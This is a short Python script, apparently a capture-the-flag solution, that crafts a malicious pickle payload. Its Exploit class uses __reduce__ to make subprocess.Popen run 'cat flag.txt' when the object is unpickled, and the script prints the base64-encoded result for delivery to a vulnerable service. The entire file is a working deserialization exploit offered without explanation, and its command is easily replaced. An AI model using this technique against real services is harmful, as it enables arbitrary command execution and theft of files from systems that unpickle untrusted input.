import subprocess
import base64
import pickle
 
class Exploit(object):
    def __reduce__(self):
        return (subprocess.Popen, (('cat', 'flag.txt'),))
 
print(base64.b64encode(pickle.dumps(Exploit())))
